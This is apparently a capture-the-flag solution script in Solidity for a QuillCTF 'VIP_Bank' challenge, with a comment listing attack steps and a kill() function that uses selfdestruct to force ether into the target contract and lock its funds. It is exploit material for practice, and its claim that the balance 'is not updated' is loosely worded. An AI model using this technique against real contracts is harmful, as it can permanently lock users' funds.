import "../src/quillctf3.sol";
import "forge-std/Script.sol";


/* Using selfdestruct() attacker can send funds to the contract and can lock all the funds forever. 
No one can withdraw the funds. Usage of address(this).balance is wrong, because the balance is not updated.


Attack steps:
1) Create a attacker contract 
2) create a function with selfdestruct() keyword
3) Give the address of the original contract as argument to the selfdestruct() function.
4) Now deploy the attacker contract
 */

contract Quillctf3 is Script {
    VIP_Bank vip_bank = new VIP_Bank();

    function kill() public {
    selfdestruct(payable(address(vip_bank)));
    //selfdestruct(vip_bank);
    }
}
